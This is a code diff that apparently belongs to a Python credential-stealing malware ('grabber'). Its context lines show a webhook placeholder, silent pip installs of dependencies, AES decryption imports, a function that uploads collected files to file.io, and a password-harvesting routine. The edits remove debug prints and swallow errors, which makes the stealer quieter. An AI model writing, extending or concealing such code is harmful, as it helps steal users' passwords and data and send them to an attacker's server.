@@ -17,7 +17,6 @@ from json import loads, dumps, load, dump
 from pathlib import Path
 from locale import windows_locale
 from importlib import import_module
-
 webhook = '%Webhook%'
 FakeWebhook = '%FakeWebhook%'
 Fakegen = '%FakeGen%' 
@@ -53,7 +52,6 @@ for module in requirements:
     except:
         subprocess.Popen(f"\"{executable}\" -m pip install {module[1]} --quiet", shell=True)
         time.sleep(3)
-
 from Cryptodome.Cipher import AES
 import requests
 def sql_connect(database_path):
@@ -1294,7 +1292,6 @@ def fileioupload(path):
     try:
         with open(path, 'rb') as file:
             response = requests.post('https://file.io/', files={'file': file})
-            print(response.json())
         return response.json()["link"]
     except Exception as e:
         return False
@@ -1665,7 +1662,7 @@ def getPassw(path, arg):
                 PasswCount += 1
         writeforfile(Passw, 'passw')
     except Exception as e:
-        print(e)
+        pass
     
 def getinfo():
     try:
